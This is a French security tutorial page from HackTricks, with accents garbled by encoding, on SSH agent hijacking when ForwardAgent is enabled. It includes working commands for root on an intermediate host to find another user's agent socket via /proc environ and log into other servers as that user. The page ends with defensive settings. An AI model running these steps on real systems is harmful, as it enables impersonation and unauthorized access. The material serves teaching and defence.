<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# R√©sum√©

Que pouvez-vous faire si vous d√©couvrez ceci dans la configuration `/etc/ssh_config` ou dans `$HOME/.ssh/config` :
```
ForwardAgent yes
```
Si vous √™tes root √† l'int√©rieur de la machine, vous pouvez probablement **acc√©der √† toute connexion ssh effectu√©e par un agent** que vous pouvez trouver dans le r√©pertoire _/tmp_

Usurpez l'identit√© de Bob en utilisant l'un des ssh-agent de Bob :
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## Pourquoi cela fonctionne-t-il ?

Lorsque vous d√©finissez la variable `SSH_AUTH_SOCK`, vous acc√©dez aux cl√©s de Bob qui ont √©t√© utilis√©es dans sa connexion ssh. Si sa cl√© priv√©e est toujours l√† (ce qui est normalement le cas), vous pourrez acc√©der √† n'importe quel h√¥te en l'utilisant.

Comme la cl√© priv√©e est sauvegard√©e dans la m√©moire de l'agent non chiffr√©e, je suppose que si vous √™tes Bob mais que vous ne connaissez pas le mot de passe de la cl√© priv√©e, vous pouvez quand m√™me acc√©der √† l'agent et l'utiliser.

Une autre possibilit√© est que l'utilisateur propri√©taire de l'agent et root puissent acc√©der √† la m√©moire de l'agent et extraire la cl√© priv√©e.

# Explication d√©taill√©e et exploitation

**Extrait de :** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Quand ForwardAgent ne peut pas √™tre consid√©r√© comme s√ªr**

SSH sans mots de passe facilite grandement la vie avec les syst√®mes d'exploitation de type Unix. Si votre r√©seau n√©cessite des sessions ssh en cha√Æne (pour acc√©der √† un r√©seau restreint, par exemple), la redirection d'agent devient extr√™mement utile. Avec la redirection d'agent, il est possible pour moi de me connecter depuis mon ordinateur portable √† mon serveur de d√©veloppement et de l√†, d'ex√©cuter un svn checkout depuis un autre serveur, le tout sans mots de passe, tout en gardant ma cl√© priv√©e en s√©curit√© sur ma station de travail locale.

Cela peut √™tre dangereux, cependant. Une recherche rapide sur le web r√©v√©lera plusieurs articles indiquant que cela n'est s√ªr que si les h√¥tes interm√©diaires sont dignes de confiance. Rarement, cependant, vous trouverez une explication du _pourquoi_ c'est dangereux.

C'est l'objet de cet article. Mais d'abord, un peu de contexte.

## **Comment fonctionne l'authentification sans mot de passe**

Lors de l'authentification en mode normal, SSH utilise votre mot de passe pour prouver que vous √™tes bien qui vous pr√©tendez √™tre. Le serveur compare un hachage de ce mot de passe √† celui qu'il a enregistr√©, v√©rifie que les hachages correspondent et vous laisse entrer.

Si un attaquant parvient √† briser le chiffrement utilis√© pour prot√©ger votre mot de passe pendant son envoi au serveur, il peut le voler et se connecter en tant que vous quand il le souhaite. Si un attaquant est autoris√© √† effectuer des centaines de milliers de tentatives, il peut √©ventuellement deviner votre mot de passe.

Une m√©thode d'authentification beaucoup plus s√ªre est [l'authentification par cl√© publique](http://www.ibm.com/developerworks/library/l-keyc/index.html), une fa√ßon de se connecter sans mot de passe. L'authentification par cl√© publique n√©cessite une paire de cl√©s publique et priv√©e assorties. La cl√© publique chiffre les messages qui ne peuvent √™tre d√©chiffr√©s qu'avec la cl√© priv√©e. L'ordinateur distant utilise sa copie de votre cl√© publique pour chiffrer un message secret √† votre intention. Vous prouvez votre identit√© en d√©chiffrant le message √† l'aide de votre cl√© priv√©e et en renvoyant le message √† l'ordinateur distant. Votre cl√© priv√©e reste en s√©curit√© sur votre ordinateur local tout le temps, √† l'abri des attaques.

La cl√© priv√©e est pr√©cieuse et doit √™tre prot√©g√©e, donc par d√©faut elle est stock√©e dans un format chiffr√©. Malheureusement, cela signifie que vous devez entrer votre phrase secr√®te de chiffrement avant de l'utiliser. De nombreux articles sugg√®rent d'utiliser des cl√©s priv√©es sans phrase secr√®te (non chiffr√©es) pour √©viter cet inconv√©nient. C'est une mauvaise id√©e, car quiconque ayant acc√®s √† votre poste de travail (par acc√®s physique, vol ou piratage) a maintenant √©galement un acc√®s libre √† tous les ordinateurs configur√©s avec votre cl√© publique.

OpenSSH inclut [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), un d√©mon qui s'ex√©cute sur votre station de travail locale. Il charge une copie d√©chiffr√©e de votre cl√© priv√©e en m√©moire, de sorte que vous n'avez √† entrer votre phrase secr√®te qu'une seule fois. Il fournit ensuite un [socket](http://en.wikipedia.org/wiki/Unix\_domain\_socket) local que le client ssh peut utiliser pour lui demander de d√©chiffrer le message chiffr√© renvoy√© par le serveur distant. Votre cl√© priv√©e reste bien en s√©curit√© dans la m√©moire du processus ssh-agent tout en vous permettant de vous d√©placer en ssh sans taper de mots de passe.

## **Comment fonctionne ForwardAgent**

De nombreuses t√¢ches n√©cessitent des sessions ssh "en cha√Æne". Consid√©rez mon exemple pr√©c√©dent : je me connecte depuis ma station de travail au serveur de d√©veloppement. L√†, je dois effectuer une mise √† jour svn, en utilisant le protocole "svn+ssh". Puisqu'il serait absurde de laisser une copie non chiffr√©e de ma cl√© priv√©e super-secr√®te sur un serveur partag√©, je suis maintenant coinc√© avec l'authentification par mot de passe. Si, cependant, j'ai activ√© "ForwardAgent" dans la configuration ssh de ma station de travail, ssh utilise ses capacit√©s de tunneling int√©gr√©es pour cr√©er un autre socket sur le serveur de d√©veloppement qui est tunnel√© vers le socket ssh-agent sur ma station de travail locale. Cela signifie que le client ssh sur le serveur de d√©veloppement peut maintenant envoyer des demandes de "d√©chiffre ce message secret" directement √† l'agent ssh en cours d'ex√©cution sur ma station de travail, s'authentifiant aupr√®s du serveur svn sans jamais avoir acc√®s √† ma cl√© priv√©e.

## **Pourquoi cela peut √™tre dangereux**

En r√©sum√©, toute personne disposant de privil√®ges root sur le serveur interm√©diaire peut utiliser librement votre ssh-agent pour s'authentifier sur d'autres serveurs. Une simple d√©monstration montre √† quel point cela peut √™tre fait facilement. Les noms d'h√¥tes et d'utilisateurs ont √©t√© modifi√©s pour prot√©ger les innocents.

Mon ordinateur portable ex√©cute ssh-agent, qui communique avec les programmes clients ssh via un socket. Le chemin vers ce socket est stock√© dans la variable d'environnement SSH_AUTH_SOCK :
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
Le programme [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nous permet de visualiser et d'interagir avec les cl√©s dans l'agent :
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
J'ai "ForwardAgent yes" dans le \~/.ssh/config sur mon ordinateur portable. Ainsi, ssh va cr√©er un tunnel reliant le socket local √† un socket local sur le serveur distant :
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
Bien que mes cl√©s ne soient pas install√©es sur ¬´ seattle ¬ª, les programmes clients ssh sont toujours capables d'acc√©der √† l'agent ex√©cut√© sur ma machine locale :
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Alors... avec qui pouvons-nous jouer ?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Je n'ai jamais appr√©ci√© Bob. Pour trouver sa connexion d'agent, je dois trouver le processus enfant de l'une de ses sessions ssh :
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Il existe plusieurs m√©thodes pour que le root puisse voir l'environnement d'un processus en cours d'ex√©cution. Sur Linux, les donn√©es sont disponibles dans /proc/\<pid>/environ. Comme elles sont stock√©es sous forme de cha√Ænes termin√©es par NULL, j'utiliserai tr pour convertir les NULL en sauts de ligne :
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
Je dispose maintenant de toutes les informations n√©cessaires pour d√©tourner le ssh-agent de Bob :
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Si j'ai une cible sp√©cifique en t√™te, je devrais maintenant pouvoir me connecter directement. Sinon, simplement observer la liste des processus ou chercher dans le fichier d'historique de Bob devrait pr√©senter de nombreuses cibles d'opportunit√©. Dans ce cas, je sais que Bob a toute sorte de fichiers super secrets stock√©s sur le serveur nomm√© "boston" :
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **Prot√©gez-vous !**

Ne laissez pas votre ssh-agent stocker vos cl√©s ind√©finiment. Sur OS X, configurez votre trousseau pour qu'il se verrouille apr√®s une p√©riode d'inactivit√© ou lorsque votre √©cran se verrouille. Sur d'autres plateformes de type Unix, utilisez l'option -t avec ssh-agent pour que ses cl√©s soient supprim√©es apr√®s  secondes.

N'activez pas la redirection d'agent lors de la connexion √† des h√¥tes non fiables. Heureusement, la syntaxe de \~/.ssh/config rend cela assez simple :
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **Lectures recommand√©es**

* [Gestion des cl√©s OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) ‚Äì Daniel Robbins
* [Guide illustr√© du transfert d'agent SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) ‚Äì Steve Friedl
* [manuel de ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [manuel de ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
